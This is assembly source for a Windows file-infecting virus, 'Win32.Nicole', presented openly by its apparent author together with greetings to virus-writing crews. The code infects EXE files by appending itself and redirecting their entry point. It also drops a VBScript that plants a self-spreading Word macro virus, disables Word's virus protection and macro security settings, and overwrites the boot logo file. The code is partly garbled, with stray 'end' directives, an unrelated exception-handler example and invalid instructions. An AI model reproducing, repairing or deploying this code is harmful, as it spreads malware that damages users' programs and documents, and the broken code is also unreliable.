;******************************************************
;****Win32.Nicole***coded by Necronomikon[Shadowvx]****
;******************************************************
; Name       : Win32.Nicole
; Author     : Necronomikon
; Group      : ShadowVX (at the moment!)
; Origin     : Germany
; Platform   : Win9x,ME (not tested under NT/2K!?)
; Resident   : no
; Poly       : no
; Payload    : yes,it drops a word97/2K.Classvirus and drops a bmp file to c:\ called Logo.sys. This changes the start up screen while windows is loading with another logo.;p
; Destructiv : no
;--------
;-Infos:-
;--------
;Heya ppl this is Necronomikon,when i write this piece of code i got in trouble with the german
;police(damn drugz!!!)!So i am really sorry for my lazy "Code-description",no comments in it!:(
;When i have enought time i'll do it and update it!;)
;
;Greetz goes out to:
;-------------------
;Gigabyte
;jackie
;SnakeByte
;Ratter
;WalruS
;daniel- und alle anderen auf #german_vir
;gl_storm
;Ultras
;Del_Armg0
;BlackJack
;Fatal Error
;BumbleBee
;Evul
;Lys Kovick
;SerialKiller (TheRiddl;))
;Perikles
;-KD-
;SnakeMan
;SlageHammer
;dageshi
;Roadkil
;Yello
;BlackCat
;
;#virus,#shadowvx,#vir,#vxers,#vxtrader,#mtx,#gigavirii
;
;Non-VX.Greetz:newmann,ocker,Fii7e,LISP,NewViper,Ling0,Snapman and especially Sui(BN is kewl!);)
;---------------------------

.586p
.model flat
jumps                      
.radix 16                  
extrn ExitProcess:PROC     
extrn MessageBoxA:PROC  
   
.data     


include nic.inc
bmpSize         equ     offset bmpName-offset nic

bmpName         db      'C:\Logo.sys',0 ; name for bmp
                                        ; name to install in windows dir
                 
 db ?                      


 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME                ENDS

szTitle         db      "Structured Exception Handler example",0
szMessage       db      "Intercepted General Protection Fault!",0

.code

start:
        call    setupSEH                        ; The call pushes the offset
                                                ; past it in the stack rigth?
                                                ; So we will use that :)
exceptionhandler:
        mov     esp,[esp+8]                     ; Error gives us old ESP                          
                                                ; in [ESP+8]

        push    00000000h                       ; Parameters for MessageBoxA
        push    offset szTitle
        push    offset szMessage
        push    00000000h
        call    MessageBoxA

        push    00000000h                       
        call    ExitProcess                     ; Exit Application

setupSEH:
        push    dword ptr fs:[0]                ; Push original SEH handler
        mov     fs:[0],esp                      ; And put the new one (located
                                                ; after the first call)

        mov     ebx,0BFF70000h                  ; Try to write in kernel (will
        mov     eax,012345678h                  ; generate an exception)
        xchg    eax,[ebx]

end     start

Virus: 
 call    createBmp               ; creates a logo.sys in c:\                 
 call Delta                
Delta:
 pop ebp                   
 sub ebp, offset Delta     
 mov eax, dword ptr [ebp+OldEIP]
 mov dword ptr [ebp+retEIP], eax
 mov eax, dword ptr [ebp+OldBase]
 mov dword ptr [ebp+retBas], eax
 mov esi, [esp]            
 xor si, si                
 call GetKernel            
 jnc GetApis               
 mov esi, 0BFF70000h       

 call GetKernel
 jnc GetApis

 mov esi, 077F00000h       
 call GetKernel

 jnc GetApis

 mov esi, 077e00000h       
 call GetKernel

 jnc GetApis
 jmp ExecuteHost           

GetKernel:                

 mov byte ptr [ebp+K32Trys], 5h

GK1:
 cmp byte ptr [ebp+K32Trys], 00h
 jz NoKernel               

 call CheckMZSign          
 jnc CheckPE



GK2:

 sub esi, 10000h           
 dec byte ptr [ebp+K32Trys]
 jmp GK1                  

CheckPE:                   
 mov edi, [esi+3Ch]        
 add edi, esi
 call CheckPESign
 jnc CheckDLL   
 jmp GK2

CheckDLL:
 add edi, 16h      
 mov bx, word ptr [edi] 
 and bx, 0F000h         
 cmp bx, 02000h        
 jne GK2               

KernelFound:
 sub edi, 16h 
 xchg eax, edi 
 xchg ebx, esi
 clc         
 ret 

NoKernel:
 stc
 ret

 K32Trys      db 5h        

;This piece of code is taken from Ultras Words Infection Tutorial!

call script_start          ; call our Script

num_bytes_written       dd      ? 
vfile 			db 	'c:\nici.vbs',00h
flz_handle              dd      ?
vscript_filesize 	equ 	offset script_end - offset script_start

FILE_ATTRIBUTE_NORMAL   equ     00000080h
CREATE_ALWAYS           equ     00000002h
FILE_SHARE_READ         equ     00000001h
GENERIC_WRITE           equ     40000000h

script_start:
db 'On Error Resume Next',0dh,0ah
Db 'Dim WordObj',0dh,0ah

db 'Set WordObj = WScript.CreateObject("Word.Application")',0dh,0ah
Db 'Set NT = WordObj.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule',0dh,0ah

db 'WordObj.Options.SaveNormalPrompt = False',0dh,0ah

db 'NT.DeleteLines 1, NT.CountOfLines',0dh,0ah
db 'NT.InsertLines 1, "Private Sub Document_Close()"',0dh,0ah
db 'NT.InsertLines 2, "On Error Resume Next"',0dh,0ah
db 'NT.InsertLines 3, "' Virus Name : Win32.Nicole.Dropper"',0dh,0ah
db 'NT.InsertLines 4, "' VirusAuthor : Necronomikon"',0dh,0ah
db 'NT.InsertLines 5, "With Options"',0dh,0ah
db 'NT.InsertLines 6, ".VirusProtection = 0"',0dh,0ah
db 'NT.InsertLines 7, ".SaveNormalPrompt = 0"',0dh,0ah
db 'NT.InsertLines 8, ".ConfirmConversions = 0"',0dh,0ah
db 'NT.InsertLines 9, "End With"',0dh,0ah
db 'NT.InsertLines 10, "Application.DisplayStatusBar = False"',0dh,0ah
db 'NT.InsertLines 11, "ActiveDocument.ReadOnlyRecommended = False"',0dh,0ah
db 'NT.InsertLines 12, "System.PrivateProfileString(""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level"") = 1&"',0dh,0ah
db 'NT.InsertLines 13, "CommandBars(""Macro"").Controls("Security...").Enabled = False"',0dh,0ah
db 'NT.InsertLines 14, "Set NT = NormalTemplate.VBProject.VBComponents(1).codemodule"',0dh,0ah
db 'NT.InsertLines 15, "Set AD = ActiveDocument.VBProject.VBComponents(1).codemodule"',0dh,0ah
db 'NT.InsertLines 16, "Open ""C:\Windows\"" & Application.Username & "".sys""" For Output As #1"',0dh,0ah
db 'NT.InsertLines 17, "Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 150)"',0dh,0ah
db 'NT.InsertLines 18, "Close #1"',0dh,0ah
db 'NT.InsertLines 19, "If NT.Lines(1, 1) <> ""'"" Then"',0dh,0ah
db 'NT.InsertLines 20, "NT.DeleteLines 1, NT.CountOfLines"',0dh,0ah
db 'NT.InsertLines 21, "NT.AddFromFile (""C:\Windows\"" & Application.Username & "".sys"")"',0dh,0ah
db 'NT.InsertLines 22, "NormalTemplate.Save"',0dh,0ah
db 'NT.InsertLines 23, "ElseIf AD.Lines(1, 1) <> ""'"" Then"',0dh,0ah
db 'NT.InsertLines 24, "AD.DeleteLines 1, AD.CountOfLines"',0dh,0ah
db 'NT.InsertLines 25, "AD.AddFromFile (""C:\Windows\"" & Application.Username & "".sys"")"',0dh,0ah
db 'NT.InsertLines 26, "ActiveDocument.Save"',0dh,0ah
db 'NT.InsertLines 27, "End If"',0dh,0ah
db 'NT.InsertLines 28, "Set NEC = KKS"',0dh,0ah
db 'NT.InsertLines 29, "Trigger = Int(Rnd * 100)"',0dh,0ah
db 'NT.InsertLines 30, "If Trigger = 3 Then Call Message"',0dh,0ah
db 'NT.InsertLines 31, "End Sub"',0dh,0ah
db 'NT.InsertLines 32, "Private Sub Message()"',0dh,0ah
db 'NT.InsertLines 33, "On Error Resume Next"',0dh,0ah
db 'NT.InsertLines 34, "MsgBox ""Written by a Coder in LUV!:o)"", vbInformation, ""*Win32.Nicole*(Dropper)"""',0dh,0ah
db 'NT.InsertLines 35, "End Sub"',0dh,0ah
db 'WordObj.Run "Normal.ThisDocument.AutoExec"',0dh,0ah
db 'WordObj.Quit',00h
script_end:

scrpt:

 ; create virus script
 push 00000000h
 push FILE_ATTRIBUTE_NORMAL
 push CREATE_ALWAYS
 push 00000000h
 push FILE_SHARE_READ
 push GENERIC_WRITE
 push offset vfile
 call CreateFileA
 mov  [flz_handle],eax

 ; shall write down in script
 push 00000000h
 push offset num_bytes_written
 push vscript_filesize
 push offset script_start 
 push [flz_handle]
 call WriteFile

 ; close file
 push [flz_handle]
 call CloseHandle

 push 1
 push offset vfile
 call WinExec

exit:
 push 0
 call ExitProcess

end scrpt

;stop thats all!(i think;))

 LL  db 'LoadLibraryA', 0h  
 GPA db 'GetProcAddress', 0h 

GetApis:                  
 mov [ebp+KernelAddy], eax 
 mov [ebp+MZAddy], ebx
 lea edx, [ebp+LL]         
 mov ecx, 0Ch               
 call SearchAPI1  
 mov [ebp+XLoadLibraryA], eax
 xchg eax, ecx             
 jecxz ExecuteHost
 lea edx, [ebp+GPA]   
 mov ecx, 0Eh  
 call SearchAPI1
 mov [ebp+XGetProcAddress], eax

 xchg eax, ecx   

 jecxz ExecuteHost
 jmp GetAPI2               
 KERNEL32  db 'Kernel32',0 

GetAPI2:                  

 lea eax, [ebp+KERNEL32]
 push eax
 call dword ptr [ebp+XLoadLibraryA]
 mov [ebp+K32Handle], eax
 nici eax, eax
 jz ExecuteHost
 lea esi, [ebp+Kernel32Names]
 lea edi, [ebp+XFindFirstFileA]
 mov ebx, [ebp+K32Handle]
 push NumberOfKernel32APIS
 pop ecx
 call GetAPI3
 jmp Outbreak

SearchAPI1:             

 and word ptr [ebp+counter], 0h
 mov eax, [ebp+KernelAddy] 
 mov esi, [eax+78h]        
 add esi, [ebp+MZAddy]     
 add esi, 1Ch              
 lodsd                     
 add eax, [ebp+MZAddy]     
 mov dword ptr [ebp+ATableVA], eax
 lodsd                     
 add eax, [ebp+MZAddy]     
 mov dword ptr [ebp+NTableVA], eax
 lodsd                     
 add eax, [ebp+MZAddy]     
 mov dword ptr [ebp+OTableVA], eax
 mov esi, [ebp+NTableVA]

SearchNextApi1:
 push esi                  
 lodsd
 add eax, [ebp+MZAddy]    
 mov esi, eax              
 mov edi, edx 
 push ecx
 cld 
 rep cmpsb
 pop ecx
 jz FoundApi1
 pop esi            
 add esi, 4h        
 inc word ptr [ebp+counter] 
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1 

FoundApi1:
 pop esi
 movzx eax, word ptr [ebp+counter]
 shl eax, 1h          
 add eax, dword ptr [ebp+OTableVA]
 xor esi, esi
 xchg eax, esi
 lodsw        
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
 mov esi, eax  
 lodsd                  
 add eax, [ebp+MZAddy]  
 ret  

NotFoundApi1:
 xor eax, eax 
 ret          

Kernel32Names:

 NumberOfKernel32APIS equ 8d

 db 'FindFirstFileA', 0

 db 'FindNextFileA', 0

 db 'FindClose', 0

 db 'CreateFileA', 0

 db 'CloseHandle', 0

 db 'CreateFileMappingA', 0

 db 'MapViewOfFile', 0

 db 'UnmapViewOfFile', 0


GetAPI3:
 push ecx
 push esi    
 push ebx   
 call dword ptr [ebp+XGetProcAddress]
 stosd  
 pop ecx 
 dec ecx
 jz EndApi3
 push ecx  

SearchZero:    
 cmp byte ptr [esi], 0h
 je GotZero
 inc esi
 jmp SearchZero

GotZero:
 inc esi
 pop ecx                  
 jmp GetAPI3              

 EndApi3: 
 ret 

Outbreak:
 mov [ebp+InfCounter], 10d 


InfectCurDir:
 lea esi, [ebp+filemask]
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir1  
 dec eax

InfectCurDirFile:
 lea esi, [ebp+WFD_szFileName]
 call InfectFile    
 cmp [ebp+InfCounter], 0h  
 jna EndInfectCurDir2
 call FindNextFileProc
 nici eax, eax
 jnz InfectCurDirFile

 EndInfectCurDir2:       
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

EndInfectCurDir1:
 jmp ExecuteHost
 InfCounter db 0h          
 FindHandle dd 0h          
 filemask   db '*.EXE', 0  

ExecuteHost:              
 or ebp, ebp 
 jz FirstGenHost
 mov eax,12345678h 
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBas dd 0h
 jmp eax

FirstGenHost:
 push 0h                   
 call ExitProcess          
 OldEIP  dd 0h             
 OldBase dd 0h             
 NewEIP  dd 0h             

InfectFile:  
 cmp dword ptr [ebp+WFD_nFileSizeLow], 200d
 jbe NoInfection
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile  
 jc NoInfection 
 mov esi, eax
 call CheckMZSign  
 jc Notagoodfile
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 xor esi, esi
 mov esi, [eax+3Ch]
 cmp dword ptr [ebp+WFD_nFileSizeLow], esi
 jb Notagoodfile
 add esi, eax
 mov edi, esi
 call CheckPESign  
 jc Notagoodfile
 cmp dword ptr [esi+4Ch], 'iciN' ;check infection marker
 jz Notagoodfile
 mov bx, word ptr [esi+16h]
 and bx, 0F000h            
 cmp bx, 02000h
 je Notagoodfile           
 mov bx, word ptr [esi+16h]
 and bx, 00002h 
 cmp bx, 00002h
 jne Notagoodfile         
 call InfectEXE   
 jc NoInfection   

Notagoodfile:
 call UnMapFile 

NoInfection:
 ret

OpenFile:
 xor eax,eax 
 push eax
 push eax
 push 3h
 push eax
 inc eax
 push eax
 push 80000000h or 40000000h
 push esi    
 call dword ptr [ebp+XCreateFileA]
 inc eax
 jz Closed 
 dec eax   
 mov dword ptr [ebp+FileHandle],eax
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]

CreateMap:                 
 push ecx 
 xor eax,eax  
 push eax
 push ecx
 push eax
 push 00000004h
 push eax
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle],eax
 pop ecx       
 nici eax, eax  
 jz CloseFile  
 xor eax,eax             
 push ecx
 push eax
 push eax
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax,eax       
 jz UnMapFile
 mov dword ptr [ebp+MapAddress],eax
 clc  
 ret

UnMapFile:
 call UnMapFile2

CloseFile:   
 push dword ptr [ebp+FileHandle]
 call [ebp+XCloseHandle]

Closed:
 stc   
 ret



UnMapFile2:       
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
 ret

InfectEXE:  
 mov ecx, [esi+3Ch]    
 mov eax, dword ptr [ebp+WFD_nFileSizeLow] 
 add eax, VirusSize
 call Align     
 mov dword ptr [ebp+NewSize], eax
 xchg ecx, eax
 pushad   
 call UnMapFile2
 popad 
 call CreateMap  
 jc NoEXE
 mov esi, dword ptr [eax+3Ch]
 add esi, eax
 mov edi, esi 
 movzx eax, word ptr [edi+06h]
 dec eax
 imul eax, eax, 28h
 add esi, eax  
 add esi, 78h  
 mov edx, [edi+74h]
 shl edx, 3h  
 add esi, edx 
 mov eax, [edi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov eax, [edi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov edx, [esi+10h]    
 mov ebx, edx
 add edx, [esi+14h] 
 push edx           
 mov eax, ebx
 add eax, [esi+0Ch]        
 mov [edi+28h], eax
 mov dword ptr [ebp+NewEIP], eax
 mov eax, [esi+10h]  
 push eax
 add eax, VirusSize
 mov ecx, [edi+3Ch] 
 call Align
 mov [esi+10h], eax
 pop eax  
 add eax, VirusSize
 add eax, Buffersize
 mov [esi+08h], eax
 pop edx
 mov eax, [esi+10h]
 add eax, [esi+0Ch]
 mov [edi+50h], eax
 or dword ptr [esi+24h], 0A0000020h
 mov dword ptr [edi+4Ch], 'iciN'
 xchg edi, edx
 lea esi, [ebp+Virus]
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 rep movsb
 dec byte ptr [ebp+InfCounter]

NoEXE:          
 stc
 ret

Align:
 push edx
 xor edx, edx
 push eax
 div ecx
 pop eax
 sub ecx, edx
 add eax, ecx
 pop edx
ret

FindFirstFileProc:
 lea eax, [ebp+WIN32_FIND_DATA]
 push eax
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret

FindNextFileProc:
 lea edi, [ebp+WFD_szFileName]
 mov ecx, 276d 
 xor eax, eax
 rep stosb
 lea eax, [ebp+WIN32_FIND_DATA]
 push eax
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
 ret

CheckPESign:
 cmp dword ptr [edi], 'FP' 
 jae NoPESign
 cmp dword ptr [edi], 'DP' 
 jbe NoPESign
 clc   
 ret

 NoPESign:
 stc
 ret

CheckMZSign:
 cmp word ptr [esi], '[M'
 jae NoPESign
 cmp word ptr [esi], 'YM'
 jbe NoPESign
 clc
 ret
 ret

createBmp:
        push    L 0
        push    L 20h                   ; archive
        push    L 2
        push    L 0h
        push    L (1h OR 2h)
        push    L 40000000h
        lea     eax,bmpName
        push    eax
        call    CreateFileA             ; open new file for write (shared)
        cmp     eax,-1
        je      errBmp

        mov     dword ptr [fHnd],eax    ; save handle

        lea     edi,nic                 ; uncompress and write the bmp
        mov     dword ptr [cont0],bmpSize
dcLoop:
        push    L 0
        lea     eax,nec
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        cmp     byte ptr [edi],0ffh
        jne     skipFF

        dec     dword ptr [cont0]
        call    addFF
        inc     edi

skipFF:
        inc     edi
        dec     dword ptr [cont0]
        cmp     dword ptr [cont0],0
        jne     dcLoop

        push    dword ptr [fHnd]        ; close file
        call    CloseHandle

errBmp:
        ret

addFF:
        xor     ecx,ecx
        mov     cl,byte ptr [edi+1]
        mov     byte ptr [cont1],cl
        cmp     cl,0
        jne     addFFLoop
        ret

addFFLoop:
        push    L 0
        lea     eax,nec
        push    eax
        push    L 1
        push    edi
        push    dword ptr [fHnd]
        call    WriteFile               ; write data

        dec     byte ptr [cont1]
        cmp     byte ptr [cont1],0
        jne     addFFLoop

        ret



VirusEnd:             

 K32Handle dd (?)           
 XLoadLibraryA    dd (?)   
 XGetProcAddress  dd (?)
 XFindFirstFileA       dd (?)
 XFindNextFileA        dd (?)
 XFindClose            dd (?)
 XCreateFileA          dd (?)
 XCloseHandle          dd (?)
 XWriteFile            dd (?)
 XCreateFileMappingA   dd (?)
 XMapViewOfFile        dd (?)
 XUnmapViewOfFile      dd (?)

 KernelAddy   dd (?)       ; PE-Header
 MZAddy       dd (?)       ; MZ-Header

 counter  dw (?)           

 ATableVA dd (?)  
 NTableVA dd (?)  
 OTableVA dd (?) 
NewSize   dd (?)  

 WIN32_FIND_DATA         label    byte

 WFD_dwFileAttributes    dd       ?

 WFD_ftCreationTime      FILETIME ?

 WFD_ftLastAccessTime    FILETIME ?

 WFD_ftLastWriteTime     FILETIME ?

 WFD_nFileSizeHigh       dd       ?

 WFD_nFileSizeLow        dd       ?

 WFD_dwReserved0         dd       ?

 WFD_dwReserved1         dd       ?

 WFD_szFileName          db       260d dup (?)

 WFD_szAlternateFileName db       13   dup (?)

 WFD_szAlternateEnding   db       03   dup (?)



 FileHandle              dd       (?)       
 MapHandle               dd       (?)      
 MapAddress              dd       (?)      

EndBufferData:
end Virus

